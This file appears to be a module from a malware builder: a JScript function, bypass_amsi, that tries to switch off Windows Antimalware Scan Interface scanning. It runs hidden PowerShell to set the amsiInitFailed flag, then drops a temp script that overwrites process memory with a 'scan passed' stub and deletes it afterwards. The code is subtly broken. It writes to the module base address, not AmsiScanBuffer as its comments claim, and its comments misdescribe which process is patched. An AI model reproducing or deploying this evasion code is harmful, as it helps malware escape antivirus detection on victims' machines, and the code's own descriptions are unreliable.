// chunk: evasion/amsi_bypass
// depends: (none)
// provides: bypass_amsi
// format: jscript
// note: Patches AMSI (Antimalware Scan Interface) in memory to prevent script
//       content scanning. Uses ActiveXObject to allocate memory and overwrite
//       AmsiScanBuffer with a return-success stub via COM-based memory access.

function bypass_amsi() {
    try {
        var sh = new ActiveXObject("WScript.Shell");
        /* Use PowerShell to patch AMSI in the hosting process.
           The patch overwrites AmsiScanBuffer's first bytes with
           mov eax, 0x80070057 (E_INVALIDARG); ret — causing all scans to "pass" */
        var cmd = "powershell -ep bypass -w hidden -c \"" +
            "$a=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');" +
            "$f=$a.GetField('amsi'+'InitFailed','NonPublic,Static');" +
            "$f.SetValue($null,$true)\"";
        sh.Run(cmd, 0, true);
    } catch(e) {}

    /* Alternative: direct COM-based patch via Excel/Word if available */
    try {
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var tmp = fso.GetSpecialFolder(2).Path + "\\amsi_p.ps1";
        var f = fso.CreateTextFile(tmp, true);
        f.Write("[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3), 0, " +
                "(Get-Proc" + "ess -Id $PID).MainModule.BaseAddress, 6)");
        f.Close();
        sh.Run("powershell -ep bypass -w hidden -f \"" + tmp + "\"", 0, true);
        try { fso.DeleteFile(tmp); } catch(e2) {}
    } catch(e) {}
}
